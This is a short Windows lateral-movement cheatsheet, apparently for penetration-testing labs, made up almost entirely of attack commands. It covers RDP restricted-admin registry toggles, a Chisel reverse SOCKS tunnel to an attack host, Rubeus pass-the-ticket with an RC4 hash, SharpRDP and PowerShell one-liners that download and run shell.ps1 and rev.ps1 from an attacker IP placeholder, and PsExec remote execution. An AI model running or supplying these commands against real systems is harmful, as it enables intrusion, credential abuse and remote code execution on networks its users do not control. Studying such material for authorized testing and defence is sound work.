## Windows Lateral Movement Introduction and Command Line cheatsheet.

> Lateral movement refers to the techniques we use to move through a network after gaining initial access. 
> By understanding lateral movement, attackers and defenders can better navigate and secure networks. 
> This knowledge allows defenders to implement more effective security measures and helps attackers identify and exploit weaknesses in network defenses, ultimately leading to a more robust and resilient security posture. 


### RDP Commands

- Open Remote Desktop Connection client (Windows)

	C:\> mstsc.exe 

- Open Remote Desktop Connection client in Restricted Admin mode 


	C:\> mstsc.exe /restrictedAdmin 

	

- Query, Disable, and Enable DisableRestrictedAdmin value in LSA settings. 

	
	C:\> reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin 
	
	C:\> reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD 
	
	C:\> reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 1 /t REG_DWORD 
	

- Chisel Server & Client. 

	
	$ ./chisel server --reverse --port 9999
	
	C:\> chisel.exe client "ATTACK HOST":"PORT" R:socks
	

- Rubeus Pass the Ticket 

	PS C:\> .\Rubeus.exe createnetonly /program:powershell.exe /show 
	
	PS C:\> .\Rubeus.exe asktgt /user:"USER" /rc4:"HASH" /domain:targetdomain.local /ptt 
	

- Execute Powershell command on Windows Server using SharpRDP

	
	C:\> SharpRDP.exe computername=dc01 command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://"ATTACK-IP:PORT"/shell.ps1')" username=inlanefreight\"USER" password="PASS"

	PS C:\> IEX(IWR -Uri 'http://"ATTACK IP:PORT"/rev.ps1' -OutFile C:\>rev.ps1 -UseBasicParsing);C:\>rev.ps1 
	

### SMB Commands


- Execute command on remote server using PsExec

	PS C:\> .\PsExec.exe \\DC01 -i -s -u INLANEFREIGHT\'USER' -p 'PASS' cmd
